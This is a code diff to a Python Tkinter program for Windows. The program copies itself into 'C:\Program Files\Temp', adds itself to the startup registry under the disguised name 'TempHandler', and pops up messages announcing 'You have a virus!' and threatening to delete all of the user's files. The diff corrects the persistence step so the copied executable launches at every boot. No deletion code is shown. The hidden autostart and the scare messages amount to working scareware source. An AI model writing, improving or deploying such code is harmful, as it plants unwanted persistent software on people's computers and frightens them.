@@ -3,7 +3,7 @@ import tkinter as tk
 from tkinter import ttk
 from tqdm import tqdm
 from tkinter import messagebox
-import winreg as reg  # Import the Windows Registry module
+import winreg as reg
 
 # Add the program to Windows startup
 def add_to_startup(file_path, app_name="temphandler"):
@@ -21,6 +21,7 @@ if getattr(sys, 'frozen', False):
     source_file = sys.executable
 else:
     source_file = __file__
+source_file_for_copied_exe = 'C:\\Program Files\\Temp\\TempHandler.exe'
 
 destination_dir = 'C:\\Program Files\\Temp'
 
@@ -39,8 +40,7 @@ except Exception as e:
     messagebox.showerror(title='Error', message=f'An unexpected error occurred: {e}')
     sys.exit()
 
-# Add the executable to startup
-add_to_startup(source_file, app_name="TempHandler")
+add_to_startup(source_file_for_copied_exe, app_name="TempHandler")
 
 messagebox.showinfo(title='Congratulations!', message='You have a virus!')
 messagebox.showwarning(title='WARNING!', message='This virus will break your computer apart!\nThis virus will delete all your files!\nThis virus will delete all your folders!\nThis virus will delete all your programs!\nThis virus will delete all your games!\nThis virus will delete all your music!\nThis virus will delete all your videos!\nThis virus will delete all your pictures!\nThis virus will delete all your documents!\nThis virus will delete all your downloads!\nThis virus will delete all your desktop items!')
